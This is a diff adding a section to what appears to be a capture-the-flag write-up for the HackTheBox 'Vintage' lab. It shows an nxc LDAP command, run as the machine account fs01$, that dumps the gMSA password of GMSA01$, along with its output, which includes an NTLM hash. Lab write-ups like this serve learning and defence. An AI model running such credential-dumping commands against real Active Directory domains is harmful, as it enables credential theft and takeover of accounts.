@@ -160,3 +160,12 @@ I ran nxc again with `--rid-brute` and found some machine accounts and ive attem
 Found outbound object control on this machine account
 
 # Dumping gMSA password of `GMSA01$`
+```python
+nxc ldap dc01.vintage.htb -u 'fs01$' -p 'fs01' --gmsa -k
+LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01$:fs01 
+LDAP        dc01.vintage.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.vintage.htb 389    DC01             Account: gMSA01$              NTLM: 0851299c01b944d01099fc977eaa6c67     PrincipalsAllowedToReadPassword: Domain Computers
+```
+Found the NTLM hash of this computer account
+
